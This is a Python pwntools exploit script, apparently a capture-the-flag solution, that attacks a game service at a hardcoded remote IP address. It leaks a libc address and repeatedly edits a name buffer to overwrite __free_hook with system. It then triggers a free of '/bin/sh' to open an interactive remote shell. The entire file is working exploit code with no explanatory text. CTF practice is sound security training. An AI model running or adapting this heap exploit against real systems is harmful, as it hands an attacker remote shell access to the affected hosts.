#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2021 vam <edit py/.vimrc to change me>
#
# Distributed under terms of the MIT license.
from pwn import *
#io = process("./game.out")
io = remote("52.152.231.198",8082)
context.log_level = 'debug'
libc = ELF("./bc.so.6")
def debug():
    print io.pid
    pause()

def add():
    io.sendlineafter("Please input an level from 1-9",'1')
    io.send("w\ns\na\na\nd\ns\ns\nw\nd\nd\n") 
    io.sendlineafter("Please input an level from 1-9",'2')
    io.sendlineafter("Please input an order:",'q')
    io.sendafter("leave your name?",'n\n')
    io.sendafter("restart?",'y\n')
def edit(name):
    io.sendlineafter("Please input an level from 1-9",'q')
    io.sendafter("leave your name?",'y\n')
    io.sendafter("your name:\n",name+"\n")
    io.sendafter("restart?",'y\n')  
def exploit():
    for i in range(1):
        add()
    io.sendlineafter("Please input an level from 1-9",'l') 
    s = io.recvuntil("message:")
    s = io.recvline() 
    s = s[:-1]
    s = s.ljust(8, chr(0))
    s = u64(s) 
    print hex(s) 
    libc.address = s - 0x3ebca0
    print hex(libc.address)
    edit('a'*0x50)
    freehook = libc.sym['__free_hook']
    payload = p64(freehook) 
    payload = payload.ljust(0x50,'a')
    edit(payload)
    edit(payload) 
    system = libc.sym["system"]
    payload = p64(system)
    payload = payload.ljust(0x50,'a') 
    edit(payload)
    io.sendlineafter("Please input an level from 1-9",'1') 
    io.sendafter("Please input an order:",'m\n')
    io.sendafter("message:",'/bin/sh\x00\n')
    io.sendafter("Please input an order:",'q\n') 
    io.sendafter("leave your name?",'n\n')  
    io.interactive()
exploit()
